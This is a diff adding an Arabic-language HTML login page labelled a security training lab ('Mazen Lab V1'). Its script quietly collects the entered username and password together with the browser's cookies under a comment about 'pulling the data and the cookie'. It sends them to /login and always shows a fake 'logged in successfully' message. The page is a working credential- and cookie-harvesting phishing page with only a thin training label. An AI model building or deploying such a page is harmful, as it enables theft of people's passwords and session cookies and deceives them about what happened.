@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>نظام التدريب الأمني - مازن</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #2d2d2d; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 350px; text-align: center; border: 1px solid #00ff00; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #333; color: white; }
+        button { width: 95%; padding: 12px; background: #00ff00; color: black; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #00cc00; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Mazen Lab V1</h2>
+        <p>سجل دخولك للبدء في التدريب</p>
+        <form id="loginForm">
+            <input type="text" id="user" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="pass" name="password" placeholder="كلمة السر" required>
+            <button type="submit">دخول</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            // سحب البيانات والكوكي
+            const data = new URLSearchParams();
+            data.append('username', document.getElementById('user').value);
+            data.append('password', document.getElementById('pass').value);
+            data.append('cookie', document.cookie || "No-Cookie-Found");
+
+            fetch('/login', { method: 'POST', body: data })
+            .then(() => alert('تم تسجيل دخولك بنجاح!'));
+        };
+    </script>
+</body>
+</html>
+
